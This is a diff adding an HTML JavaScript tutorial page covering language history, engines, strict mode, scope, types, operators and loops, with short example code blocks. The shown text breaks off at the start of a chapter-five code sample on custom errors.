@@ -1,0 +1,994 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>JavaScript Ultimate Masterclass Roadmap | Detailed Guide with Examples</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet"/>
+<style>
+:root {
+  --primary: #f7df1e;
+  --primary-dark: #d4be10;
+  --dark: #0f172a;
+  --blue: #1e3a8a;
+  --text: #334155;
+  --text-light: #64748b;
+  --bg-light: #f8fafc;
+  --code-bg: #0f172a;
+  --code-border: #1e293b;
+  --border: #e2e8f0;
+  --shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
+  --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
+  
+  /* Syntax Highlighting */
+  --kw: #cba6f7;
+  --str: #a6e3a1;
+  --num: #fab387;
+  --cmt: #6c7086;
+  --fn: #89b4fa;
+  --cls: #f38ba8;
+  --op: #89dceb;
+  --var: #eed49f;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Plus Jakarta Sans', sans-serif; color: var(--text); background: #ffffff; line-height: 1.8; -webkit-font-smoothing: antialiased; }
+
+/* Cover Page */
+.cover {
+  background: radial-gradient(circle at 10% 20%, rgb(15, 23, 42) 0%, rgb(30, 41, 59) 90%);
+  min-height: 100vh; display: flex; flex-direction: column;
+  align-items: center; justify-content: center; text-align: center;
+  padding: 80px 40px; page-break-after: always; color: white;
+}
+.js-logo {
+  width: 120px; height: 120px; background: var(--primary);
+  border-radius: 24px; display: flex; align-items: center;
+  justify-content: center; margin: 0 auto 32px;
+  box-shadow: 0 25px 50px -12px rgba(247,223,30,0.3);
+}
+.js-logo span { font-size: 64px; font-weight: 800; color: #0f172a; font-family: 'Fira Code', monospace; }
+.cover-badge {
+  background: rgba(247,223,30,0.1); border: 1px solid rgba(247,223,30,0.3);
+  color: var(--primary); font-size: 13px; font-weight: 700;
+  letter-spacing: 4px; text-transform: uppercase;
+  padding: 8px 24px; border-radius: 9999px; margin-bottom: 32px;
+}
+.cover h1 { font-size: 64px; font-weight: 800; color: #fff; line-height: 1.1; margin-bottom: 16px; letter-spacing: -2px; }
+.cover h1 span { color: var(--primary); }
+.cover-sub { font-size: 22px; color: var(--text-light); margin-bottom: 56px; max-width: 700px; }
+.stats { display: flex; gap: 48px; margin-bottom: 56px; }
+.stat-num { font-size: 40px; font-weight: 800; color: var(--primary); }
+.stat-lbl { font-size: 12px; color: var(--text-light); text-transform: uppercase; letter-spacing: 2px; }
+.cover-meta { color: var(--text-light); font-size: 14px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 24px; width: 100%; max-width: 400px; }
+
+/* Table of Contents */
+.toc { padding: 80px; page-break-after: always; background: var(--bg-light); min-height: 100vh; }
+.toc h2 { font-size: 38px; font-weight: 800; color: var(--dark); margin-bottom: 40px; padding-bottom: 16px; border-bottom: 4px solid var(--primary); display: inline-block; }
+.toc-list { list-style: none; display: grid; grid-template-columns: repeat(2, 1fr); gap: 24px; }
+.toc-item { break-inside: avoid; }
+.toc-row { display: flex; align-items: center; gap: 16px; color: var(--text); font-size: 15px; font-weight: 500; padding: 12px 16px; background: white; border-radius: 12px; box-shadow: var(--shadow); border: 1px solid var(--border); transition: transform 0.2s; }
+.ch-num { background: var(--primary); color: var(--dark); font-size: 12px; font-weight: 800; padding: 4px 10px; border-radius: 8px; min-width: 32px; text-align: center; }
+
+/* Chapter Styles */
+.chapter { page-break-before: always; }
+.ch-hdr { background: linear-gradient(135deg, var(--dark) 0%, #1e293b 100%); padding: 80px; color: #fff; }
+.ch-num-lbl { font-size: 14px; font-weight: 700; letter-spacing: 5px; text-transform: uppercase; color: var(--primary); margin-bottom: 16px; }
+.ch-hdr h2 { font-size: 44px; font-weight: 800; line-height: 1.2; margin-bottom: 16px; letter-spacing: -1px; }
+.ch-desc { font-size: 18px; color: var(--text-light); max-width: 700px; }
+.ch-body { padding: 80px; max-width: 1200px; margin: 0 auto; }
+
+/* Section Styles */
+.section { margin-bottom: 64px; border-bottom: 1px solid var(--border); padding-bottom: 48px; }
+.section:last-child { border-bottom: none; }
+.section h3 { font-size: 26px; font-weight: 700; color: var(--dark); margin-bottom: 20px; padding-left: 16px; border-left: 5px solid var(--primary); }
+.section h4 { font-size: 18px; font-weight: 600; color: var(--dark); margin: 28px 0 12px; }
+.section p { font-size: 16px; color: var(--text); margin-bottom: 18px; text-align: justify; }
+.section ul, .section ol { padding-left: 28px; margin-bottom: 18px; }
+.section li { font-size: 16px; color: var(--text); margin-bottom: 8px; }
+.section li strong { color: var(--dark); }
+
+/* Code Blocks */
+.code-block { background: var(--code-bg); border-radius: 14px; margin: 24px 0; overflow: hidden; box-shadow: var(--shadow-lg); border: 1px solid var(--code-border); }
+.code-hdr { background: #1e293b; padding: 12px 20px; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid var(--code-border); }
+.dot { width: 12px; height: 12px; border-radius: 50%; }
+.dot.r { background: #ef4444; }
+.dot.y { background: #f59e0b; }
+.dot.g { background: #10b981; }
+.fname { color: var(--text-light); font-size: 12px; font-family: 'Fira Code', monospace; margin-left: 12px; }
+.code-block pre { padding: 24px; font-family: 'Fira Code', monospace; font-size: 14px; line-height: 1.7; color: #e2e8f0; white-space: pre-wrap; overflow-x: auto; }
+
+/* Token Highlighting */
+.kw { color: var(--kw); font-weight: 500; }
+.str { color: var(--str); }
+.num { color: var(--num); }
+.cmt { color: var(--cmt); font-style: italic; }
+.fn { color: var(--fn); }
+.op { color: var(--op); }
+.cls { color: var(--cls); }
+.vr { color: var(--var); }
+
+/* Callouts */
+.callout { border-radius: 12px; padding: 20px 24px; margin: 24px 0; font-size: 15px; display: flex; gap: 16px; box-shadow: var(--shadow); }
+.ci { font-size: 24px; flex-shrink: 0; }
+.callout.info { background: #f0f9ff; border-left: 6px solid #0284c7; color: #0369a1; border-top: 1px solid #e0f2fe; border-right: 1px solid #e0f2fe; border-bottom: 1px solid #e0f2fe; }
+.callout.tip { background: #f0fdf4; border-left: 6px solid #16a34a; color: #15803d; border-top: 1px solid #dcfce7; border-right: 1px solid #dcfce7; border-bottom: 1px solid #dcfce7; }
+.callout.warn { background: #fffbeb; border-left: 6px solid #d97706; color: #b45309; border-top: 1px solid #fef3c7; border-right: 1px solid #fef3c7; border-bottom: 1px solid #fef3c7; }
+
+/* Tables */
+.tbl { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 15px; box-shadow: var(--shadow); border-radius: 12px; overflow: hidden; border: 1px solid var(--border); }
+.tbl th { background: var(--dark); color: #fff; padding: 14px 18px; text-align: left; font-weight: 600; }
+.tbl td { padding: 12px 18px; border-bottom: 1px solid var(--border); vertical-align: top; background: white; }
+.tbl tr:nth-child(even) td { background: var(--bg-light); }
+.tbl td code, .tbl th code { font-family: 'Fira Code', monospace; font-size: 13px; background: #e2e8f0; padding: 2px 6px; border-radius: 4px; color: #0f172a; }
+code { background: #f1f5f9; padding: 2px 6px; border-radius: 6px; font-family: 'Fira Code', monospace; font-size: 14px; color: #e11d48; font-weight: 500; }
+
+/* Outputs */
+.output { background: #0b0f19; border: 1px solid #1e293b; border-radius: 10px; padding: 16px 24px; margin: -12px 0 24px; font-family: 'Fira Code', monospace; font-size: 14px; color: #38bdf8; }
+.output::before { content: 'CONSOLE OUTPUT'; display: block; color: var(--text-light); font-size: 11px; margin-bottom: 8px; font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 700; letter-spacing: 1.5px; }
+
+/* Summary Box */
+.sumbox { background: linear-gradient(135deg, var(--dark) 0%, #1e293b 100%); color: #fff; border-radius: 16px; padding: 36px; margin: 36px 0; box-shadow: var(--shadow-lg); }
+.sumbox h4 { color: var(--primary); margin-bottom: 16px; font-size: 18px; font-weight: 700; }
+.sumbox ul { padding-left: 20px; list-style-type: square; }
+.sumbox li { color: #cbd5e1; font-size: 15px; margin-bottom: 8px; }
+
+/* Print CTA Page Elements */
+.print-cta { text-align: center; padding: 48px; background: var(--bg-light); border-top: 4px solid var(--primary); }
+.print-btn { background: var(--dark); color: white; border: none; padding: 14px 36px; font-size: 16px; font-weight: 700; border-radius: 10px; cursor: pointer; transition: background 0.2s; font-family: inherit; }
+.print-btn:hover { background: #1e293b; }
+
+@media print {
+  .chapter { page-break-before: always; }
+  .cover { page-break-after: always; min-height: auto; background: none; color: black; }
+  .cover h1, .cover h1 span { color: black; }
+  .toc { page-break-after: always; background: none; }
+  .toc-row { box-shadow: none; border: 1px solid #000; }
+  .code-block { box-shadow: none; page-break-inside: avoid; }
+  .print-cta { display: none; }
+  @page { margin: 0.6in; }
+}
+</style>
+</head>
+<body>
+
+<!-- ==================== COVER ==================== -->
+<div class="cover">
+  <div class="js-logo"><span>JS</span></div>
+  <div class="cover-badge">Guide</div>
+  <h1>The Ultimate <span>JavaScript</span> Masterclass</h1>
+  <p class="cover-sub">Comprehensive Exhaustive Curriculum with Detailed Theory, Deep-Dive Explanations, and Practical Code Examples</p>
+  <div class="stats">
+    <div><div class="stat-num">13</div><div class="stat-lbl">Chapters</div></div>
+    <div><div class="stat-num">100+</div><div class="stat-lbl">Concepts Covered</div></div>
+    <div><div class="stat-num">180+</div><div class="stat-lbl">Code Visualizations</div></div>
+  </div>
+  <div class="cover-meta">Comprehensive Developer Resource &bull; DeepMind Antigravity Edition</div>
+</div>
+
+<!-- ==================== TOC ==================== -->
+<div class="toc">
+  <h2>Detailed Table of Contents</h2>
+  <ul class="toc-list">
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">01</span>1. History, Engines &amp; Strict Mode</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">02</span>2. Variables, Scope &amp; Memory</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">03</span>3. Primitive &amp; Reference Types</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">04</span>4. Operators &amp; Expressions</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">05</span>5. Control Flow &amp; Error Handling</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">06</span>6. Functions, Scope &amp; Closures</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">07</span>7. OOP &amp; Prototypal Inheritance</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">08</span>8. Arrays, Iterators &amp; Generators</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">09</span>9. Async JS &amp; The Event Loop</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">10</span>10. ES6+ Meta-programming &amp; ESM</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">11</span>11. Browser, Web APIs &amp; DOM</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">12</span>12. Node.js Architecture &amp; Backend</div></li>
+    <li class="toc-item"><div class="toc-row"><span class="ch-num">13</span>13. Tooling, Optimization &amp; Security</div></li>
+  </ul>
+</div>
+
+<!-- ==================== CHAPTER 1 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 01</div>
+    <h2>History, Engines &amp; Strict Mode</h2>
+    <p class="ch-desc">Discover the historical context of JavaScript, how engines compile and execute code under the hood, and how to write cleaner code using strict mode.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>1.1 The History and Evolution of JavaScript</h3>
+      <p>JavaScript was created in September 1995 by Brendan Eich while working at Netscape Communications. Initially named <strong>Mocha</strong>, it was renamed to <strong>LiveScript</strong>, and quickly changed to <strong>JavaScript</strong> to ride the popularity of Sun Microsystems' Java. In 1997, it was standardized by ECMA International under the specification name <strong>ECMAScript</strong>.</p>
+      <p>The release of <strong>ES6 (ECMAScript 2015)</strong> was a watershed moment, introducing modern syntax such as classes, block scoping, modules, arrow functions, and promises, transforming JavaScript from a basic browser scripting tool into an enterprise-grade programming language.</p>
+    </div>
+
+    <div class="section">
+      <h3>1.2 How JavaScript Engines Work</h3>
+      <p>A JavaScript Engine executes JavaScript code. The most famous engine is Google's <strong>V8</strong> (used in Chrome, Node.js, and Opera). Other major engines include Mozilla's <strong>SpiderMonkey</strong> (Firefox) and Apple's <strong>JavaScriptCore</strong> (Safari).</p>
+      <p>Unlike traditional compiled languages, JavaScript is executed using a process called <strong>Just-In-Time (JIT) Compilation</strong>:</p>
+      <ol>
+        <li><strong>Parser</strong>: Reads the raw code and generates a structure called the <strong>AST (Abstract Syntax Tree)</strong>.</li>
+        <li><strong>Interpreter (Ignition in V8)</strong>: Converts the AST into intermediate Bytecode. This starts executing the code immediately without waiting for compilation.</li>
+        <li><strong>Compiler (TurboFan in V8)</strong>: Analyzes the running code (profiling). When it detects a function is run frequently ("hot code"), it compiles it directly into highly optimized machine code.</li>
+      </ol>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">jit-compilation-flow.js</span></div>
+        <pre><span class="cmt">// JIT optimization demonstration</span>
+<span class="kw">function</span> <span class="fn">add</span>(<span class="vr">a</span>, <span class="vr">b</span>) {
+  <span class="kw">return</span> <span class="vr">a</span> <span class="op">+</span> <span class="vr">b</span>;
+}
+
+<span class="cmt">// At first, V8 executes "add" using the Ignition interpreter.</span>
+<span class="cmt">// If "add" is called thousands of times with numbers, TurboFan compiles</span>
+<span class="cmt">// it directly to machine instructions optimized for integer addition.</span>
+<span class="kw">for</span> (<span class="kw">let</span> <span class="vr">i</span> <span class="op">=</span> <span class="num">0</span>; <span class="vr">i</span> <span class="op">&lt;</span> <span class="num">100000</span>; <span class="vr">i</span><span class="op">++</span>) {
+  <span class="fn">add</span>(<span class="vr">i</span>, <span class="num">1</span>);
+}
+
+<span class="cmt">// Deoptimization trigger: if we suddenly pass strings, the compiled machine code</span>
+<span class="cmt">// must "bail out" back to the interpreter because the type assumption failed.</span>
+<span class="fn">add</span>(<span class="str">"hello"</span>, <span class="str">"world"</span>);</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>1.3 Strict Mode</h3>
+      <p>Strict Mode was introduced in ES5 to opt-in to a restricted variant of JavaScript. It enforces cleaner code, catches silent errors, and prevents features that are poorly designed.</p>
+      <p>To enable strict mode, add the literal string <code>"use strict";</code> to the top of your script file or the top of a specific function.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">strict-mode.js</span></div>
+        <pre><span class="str">"use strict"</span>;
+
+<span class="cmt">// 1. Prevents accidental globals</span>
+<span class="cmt">// x = 10; // ReferenceError: x is not defined</span>
+
+<span class="cmt">// 2. Prevents duplicate parameter names</span>
+<span class="cmt">// function duplicate(a, a) {} // SyntaxError: Duplicate parameter name not allowed</span>
+
+<span class="cmt">// 3. Prevents deleting non-deletable properties</span>
+<span class="cmt">// delete Object.prototype; // TypeError: Cannot delete property</span>
+
+<span class="cmt">// 4. "this" in function calls is undefined instead of window/global</span>
+<span class="kw">function</span> <span class="fn">showThis</span>() {
+  <span class="fn">console</span>.<span class="fn">log</span>(<span class="kw">this</span>);
+}
+<span class="fn">showThis</span>();</pre>
+      </div>
+      <div class="output">undefined</div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 2 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 02</div>
+    <h2>Variables, Scope &amp; Memory</h2>
+    <p class="ch-desc">Learn about the differences between let, const, and var, variable hoisting, the Scope Chain, and how JavaScript manages memory heap allocation.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>2.1 Scope: Global, Function, and Block</h3>
+      <p>Scope refers to the accessibility of variables. JavaScript has three types of scope:</p>
+      <ul>
+        <li><strong>Global Scope</strong>: Variables declared outside any function or block can be accessed from anywhere.</li>
+        <li><strong>Function Scope</strong>: Variables declared with <code>var</code> inside a function are local to that function.</li>
+        <li><strong>Block Scope</strong>: Variables declared with <code>let</code> or <code>const</code> inside a block <code>{}</code> cannot be accessed outside it.</li>
+      </ul>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">scope-demonstration.js</span></div>
+        <pre><span class="kw">let</span> <span class="vr">globalVal</span> <span class="op">=</span> <span class="str">"Global"</span>;
+
+<span class="kw">function</span> <span class="fn">scopeDemo</span>() {
+  <span class="kw">var</span> <span class="vr">funcScoped</span> <span class="op">=</span> <span class="str">"Function Scoped"</span>;
+  
+  <span class="kw">if</span> (<span class="kw">true</span>) {
+    <span class="kw">let</span> <span class="vr">blockScoped</span> <span class="op">=</span> <span class="str">"Block Scoped"</span>;
+    <span class="kw">var</span> <span class="vr">leakyVar</span> <span class="op">=</span> <span class="str">"Leaky Var"</span>;
+    <span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">blockScoped</span>); <span class="cmt">// Accessible</span>
+  }
+  
+  <span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">leakyVar</span>);    <span class="cmt">// Accessible because var ignores blocks</span>
+  <span class="cmt">// console.log(blockScoped); // ReferenceError: blockScoped is not defined</span>
+}
+<span class="fn">scopeDemo</span>();</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>2.2 Hoisting and the Temporal Dead Zone (TDZ)</h3>
+      <p>Hoisting is JavaScript's default behavior of moving declarations to the top of the current scope before execution. Variables declared with <code>var</code> are hoisted and initialized with <code>undefined</code>. Variables declared with <code>let</code> and <code>const</code> are hoisted but <strong>not initialized</strong>, placing them in the <strong>Temporal Dead Zone (TDZ)</strong> until execution reaches their declaration.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">hoisting-tdz.js</span></div>
+        <pre><span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">hoistedVar</span>); <span class="cmt">// undefined</span>
+<span class="kw">var</span> <span class="vr">hoistedVar</span> <span class="op">=</span> <span class="num">42</span>;
+
+<span class="cmt">// Temporal Dead Zone (TDZ) starts here</span>
+<span class="cmt">// console.log(tdzVar); // ReferenceError: Cannot access 'tdzVar' before initialization</span>
+<span class="kw">let</span> <span class="vr">tdzVar</span> <span class="op">=</span> <span class="num">100</span>; <span class="cmt">// TDZ ends here</span>
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">tdzVar</span>); <span class="cmt">// 100</span></pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>2.3 Memory Management and Garbage Collection</h3>
+      <p>JavaScript automatically allocates memory when values are created and frees it when they are no longer used through a process called <strong>Garbage Collection</strong>. The main algorithm used by modern engines is <strong>Mark-and-Sweep</strong>. It starts from global roots and marks all reachable objects. Any objects that are not marked are swept from memory.</p>
+      
+      <div class="callout warn">
+        <span class="ci">&#9888;</span>
+        <div>
+          <strong>Memory Leaks</strong> occur when variables remain referenced but are no longer needed. Common causes: forgotten timers (using setInterval), global variables, and closures holding large scopes.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 3 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 03</div>
+    <h2>Primitive &amp; Reference Types</h2>
+    <p class="ch-desc">Understand memory stack vs heap differences, detailed analysis of JavaScript primitives, dynamic object property descriptors, and implicit coercion behavior.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>3.1 Primitives vs References</h3>
+      <p>JavaScript classifies data into two categories: <strong>Primitives</strong> and <strong>Reference Types (Objects)</strong>.</p>
+      <table class="tbl">
+        <tr><th>Feature</th><th>Primitive Types</th><th>Reference Types</th></tr>
+        <tr><td>Location</td><td>Stored directly in the <strong>Stack</strong>.</td><td>Stored in the <strong>Heap</strong>, Stack holds the reference address.</td></tr>
+        <tr><td>Mutability</td><td>Immutable (cannot change the value itself).</td><td>Mutable (properties can change).</td></tr>
+        <tr><td>Comparison</td><td>Compared by <strong>Value</strong>.</td><td>Compared by <strong>Reference</strong> (identity).</td></tr>
+      </table>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">stack-heap.js</span></div>
+        <pre><span class="cmt">// Primitive: compared by value</span>
+<span class="kw">let</span> <span class="vr">num1</span> <span class="op">=</span> <span class="num">10</span>;
+<span class="kw">let</span> <span class="vr">num2</span> <span class="op">=</span> <span class="num">10</span>;
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">num1</span> <span class="op">===</span> <span class="vr">num2</span>); <span class="cmt">// true</span>
+
+<span class="cmt">// Reference: compared by heap address reference</span>
+<span class="kw">let</span> <span class="vr">obj1</span> <span class="op">=</span> { val: <span class="num">10</span> };
+<span class="kw">let</span> <span class="vr">obj2</span> <span class="op">=</span> { val: <span class="num">10</span> };
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">obj1</span> <span class="op">===</span> <span class="vr">obj2</span>); <span class="cmt">// false</span>
+
+<span class="kw">let</span> <span class="vr">obj3</span> <span class="op">=</span> <span class="vr">obj1</span>;
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">obj1</span> <span class="op">===</span> <span class="vr">obj3</span>); <span class="cmt">// true</span></pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>3.2 Float Precision Issues (IEEE-754)</h3>
+      <p>All numbers in JavaScript are represented as double-precision floating-point numbers conforming to the IEEE-754 standard. Because computers use binary fractions, some base-10 fractions (like 0.1 and 0.2) cannot be represented exactly, leading to floating-point errors.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">float-precision.js</span></div>
+        <pre><span class="fn">console</span>.<span class="fn">log</span>(<span class="num">0.1</span> <span class="op">+</span> <span class="num">0.2</span>); <span class="cmt">// 0.30000000000000004</span>
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="num">0.1</span> <span class="op">+</span> <span class="num">0.2</span> <span class="op">===</span> <span class="num">0.3</span>); <span class="cmt">// false
+
+// Safe way to compare float numbers: Number.EPSILON</span>
+<span class="kw">const</span> <span class="fn">areEqual</span> <span class="op">=</span> (<span class="vr">a</span>, <span class="vr">b</span>) <span class="op">=&gt;</span> <span class="fn">Math</span>.<span class="fn">abs</span>(<span class="vr">a</span> <span class="op">-</span> <span class="vr">b</span>) <span class="op">&lt;</span> <span class="cls">Number</span>.EPSILON;
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="fn">areEqual</span>(<span class="num">0.1</span> <span class="op">+</span> <span class="num">0.2</span>, <span class="num">0.3</span>)); <span class="cmt">// true</span></pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>3.3 Object Property Descriptors</h3>
+      <p>Properties in JavaScript have attributes that control how they behave. You can define them using Object.defineProperty().</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">property-descriptors.js</span></div>
+        <pre><span class="kw">const</span> <span class="vr">user</span> <span class="op">=</span> {};
+
+<span class="cls">Object</span>.<span class="fn">defineProperty</span>(<span class="vr">user</span>, <span class="str">"id"</span>, {
+  value: <span class="num">1001</span>,
+  writable: <span class="kw">false</span>,     <span class="cmt">// Value cannot be changed</span>
+  enumerable: <span class="kw">true</span>,    <span class="cmt">// Shows up in loop and Object.keys()</span>
+  configurable: <span class="kw">false</span>  <span class="cmt">// Property cannot be deleted or re-configured</span>
+});
+
+<span class="cmt">// user.id = 2000; // Will throw error in strict mode</span>
+<span class="cmt">// delete user.id;  // Will fail</span>
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">user</span>.id);</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>3.4 Map, WeakMap, Set, and WeakSet</h3>
+      <p>Modern JavaScript provides optimized structures for working with key-value pairs and unique collections:</p>
+      <ul>
+        <li><strong>Map</strong>: Allows keys of any data type. Preserves insertion order.</li>
+        <li><strong>WeakMap</strong>: Keys must be objects. Holds weak references to keys, allowing automatic garbage collection if the key object has no other references.</li>
+        <li><strong>Set</strong>: A collection of unique values.</li>
+        <li><strong>WeakSet</strong>: A WeakSet contains only objects, and holds weak references to them.</li>
+      </ul>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">weakmaps.js</span></div>
+        <pre><span class="kw">let</span> <span class="vr">meta</span> <span class="op">=</span> <span class="kw">new</span> <span class="cls">WeakMap</span>();
+<span class="kw">let</span> <span class="vr">userObj</span> <span class="op">=</span> { name: <span class="str">"Sathisha"</span> };
+
+<span class="vr">meta</span>.<span class="fn">set</span>(<span class="vr">userObj</span>, <span class="str">"Admin Privileges"</span>);
+
+<span class="cmt">// If userObj is set to null, the entry in the WeakMap will be automatically garbage collected</span>
+<span class="vr">userObj</span> <span class="op">=</span> <span class="kw">null</span>;</pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 4 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 04</div>
+    <h2>Operators &amp; Expressions</h2>
+    <p class="ch-desc">Master unary, binary, logical, and bitwise operators along with dynamic evaluation rules and operator precedence logic.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>4.1 Bitwise Operators</h3>
+      <p>Bitwise operators treat their operands as a sequence of 32 bits (zeros and ones) and perform operations at the binary level.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">bitwise-ops.js</span></div>
+        <pre><span class="kw">const</span> <span class="vr">A</span> <span class="op">=</span> <span class="num">5</span>;  <span class="cmt">// Binary: 0101</span>
+<span class="kw">const</span> <span class="vr">B</span> <span class="op">=</span> <span class="num">3</span>;  <span class="cmt">// Binary: 0011</span>
+
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">A</span> <span class="op">&amp;</span> <span class="vr">B</span>);   <span class="cmt">// Bitwise AND: 0001 (1)</span>
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">A</span> <span class="op">|</span> <span class="vr">B</span>);   <span class="cmt">// Bitwise OR:  0111 (7)</span>
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">A</span> <span class="op">^</span> <span class="vr">B</span>);   <span class="cmt">// Bitwise XOR: 0110 (6)</span>
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">A</span> <span class="op">&lt;&lt;</span> <span class="num">1</span>);  <span class="cmt">// Left Shift:  1010 (10)</span></pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>4.2 Nullish Coalescing vs Logical OR</h3>
+      <p>The Nullish Coalescing operator (??) returns its right-hand operand only if the left-hand operand is null or undefined. The Logical OR operator (||) returns its right-hand operand for any falsy value (such as 0, false, or "").</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">nullish.js</span></div>
+        <pre><span class="kw">const</span> <span class="vr">score</span> <span class="op">=</span> <span class="num">0</span>;
+
+<span class="kw">const</span> <span class="vr">val1</span> <span class="op">=</span> <span class="vr">score</span> <span class="op">||</span> <span class="num">100</span>; <span class="cmt">// Returns 100 because 0 is falsy</span>
+<span class="kw">const</span> <span class="vr">val2</span> <span class="op">=</span> <span class="vr">score</span> <span class="op">??</span> <span class="num">100</span>; <span class="cmt">// Returns 0 because 0 is not nullish</span>
+
+<span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">val1</span>, <span class="vr">val2</span>);</pre>
+      </div>
+      <div class="output">100 0</div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== CHAPTER 5 ==================== -->
+<div class="chapter">
+  <div class="ch-hdr">
+    <div class="ch-num-lbl">Chapter 05</div>
+    <h2>Control Flow &amp; Error Handling</h2>
+    <p class="ch-desc">Explore iterative control structures, jump statements, custom exception hierarchies, and handling asynchronous errors.</p>
+  </div>
+  <div class="ch-body">
+    <div class="section">
+      <h3>5.1 Loop Iteration: for...in vs for...of</h3>
+      <p>Use for...in to iterate over the enumerable keys of an object. Use for...of to iterate over the iterable values of structures like Arrays, Sets, Maps, and Strings.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">loops-diff.js</span></div>
+        <pre><span class="kw">const</span> <span class="vr">list</span> <span class="op">=</span> [<span class="num">10</span>, <span class="num">20</span>, <span class="num">30</span>];
+
+<span class="cmt">// for...in prints array indices</span>
+<span class="kw">for</span> (<span class="kw">const</span> <span class="vr">key</span> <span class="kw">in</span> <span class="vr">list</span>) {
+  <span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">key</span>);
+}
+
+<span class="cmt">// for...of prints array values</span>
+<span class="kw">for</span> (<span class="kw">const</span> <span class="vr">val</span> <span class="kw">of</span> <span class="vr">list</span>) {
+  <span class="fn">console</span>.<span class="fn">log</span>(<span class="vr">val</span>);
+}</pre>
+      </div>
+      <div class="output">0<br>1<br>2<br>10<br>20<br>30</div>
+    </div>
+
+    <div class="section">
+      <h3>5.2 Custom Exception Handling</h3>
+      <p>You can throw custom errors by extending the built-in Error class. Using the cause property helps track nested root cause exceptions.</p>
+      
+      <div class="code-block">
+        <div class="code-hdr"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">custom-errors.js</span></div>
